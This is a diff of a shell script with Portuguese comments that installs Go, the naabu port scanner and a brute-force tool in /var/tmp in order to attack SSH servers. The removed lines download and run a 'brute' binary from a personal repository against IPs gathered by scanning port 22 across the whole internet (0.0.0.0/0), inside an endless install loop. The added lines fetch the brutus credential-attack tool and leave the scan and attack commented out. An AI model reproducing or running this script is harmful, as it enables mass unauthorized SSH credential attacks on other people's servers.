@@ -1,5 +1,6 @@
 #ATILA_VKZMN
 
+
 #abaixa brute golang naabu
 
 
@@ -7,34 +8,32 @@ go_url='https://go.dev/dl/go1.26.5.linux-amd64.tar.gz'
 
 url_naabu='https://github.com/projectdiscovery/naabu/archive/refs/tags/v2.6.1.tar.gz'
 
-url_brute='https://github.com/atilabyte/golang/raw/refs/heads/master/brute' 
-
-
+url_brutus='https://github.com/praetorian-inc/brutus/releases/download/v1.10.0/brutus-linux-amd64.tar.gz' 
 
 
 
 brute() {
 
-#execute brute && nabu  in targets ssh
 
-     cd /var/tmp 
-
-     cd        *.1/cmd/naabu
+cd /var/tmp/naabu-2.6.1/cmd/naabu
 
 
-
-
-# pegando sempre a versao mais recente da brute
-
-wget $url_brute -O brute || curl -L $url_brute -o brute
-
-chmod +x brute nabu  || chmod 777 brute nabu
-
-
-pgrep  nabu  ||   timeout  60s     ./nabu  -p 22 -host  0.0.0.0/0     > ips     #60  segundos para  pega os ips
-
+wget $url_brutus  -O   brutus || curl -L $url_brutus  -o  brutus #install brutus
  
-pgrep brute  ||    timeout  1000s     ./brute   #1000 segundos pra testa os ips
+tar -xf brutus
+  
+chmod  +x brutus 
+
+file brutus
+
+
+#timeout  5s     ./nabu  -p 22 -host 192.168.1.1/10  > ips     #120  segundos para  pega os ips
+ 
+
+#./brutus creds 
+
+
+
 
 
 }
@@ -42,59 +41,41 @@ pgrep brute  ||    timeout  1000s     ./brute   #1000 segundos pra testa os ips
 
 
 
+
+
+#############################################################################
+
 install_(){
-
-
-
-while  true ; do 
-
-
+ 
 out=$( ls /var/tmp/naabu-2.6.1/cmd/naabu/nabu ) #verify if nabu instaled
  
 
-if ((! $? )) ; then
+ if (( ! $? )) ; then
 
-echo nabu instaled ok
+ echo nabu ja instalado
 
-brute
-
-else 
+  brute
 
 
 
-
+else
 
 cd /var/tmp
 
-wget $go_url  -O go.gz || curl -L $go_url  -o  go.gz
+wget $go_url  -O go.gz || curl -L $go_url  -o  go.gz #install go 
 
-tar -xf  go.gz
- 
-cd  /var/tmp
+wget $url_naabu  -O naabu.gz  || curl -L $url_naabu -o naabu.gz #install naabu
 
+tar -xf go.gz && tar -xf naabu.gz
 
-wget $url_naabu  -O naabu.gz || curl -L $url_naabu -o naabu.gz
+cd  naabu-2.6.1/cmd/naabu ; mv main.go nabu.go
 
-tar -xf naabu.gz 
-
-cd naabu-2.6.1/cmd/naabu ; mv main.go nabu.go
- 
- 
-../../../go/bin/./go build nabu.go
+../../../go/bin/go build  nabu.go  #compile nabu
 
 
-
-fi ; 
-
-
-done
+fi;
 
 
 }
 
-
-
-
-
 install_
-
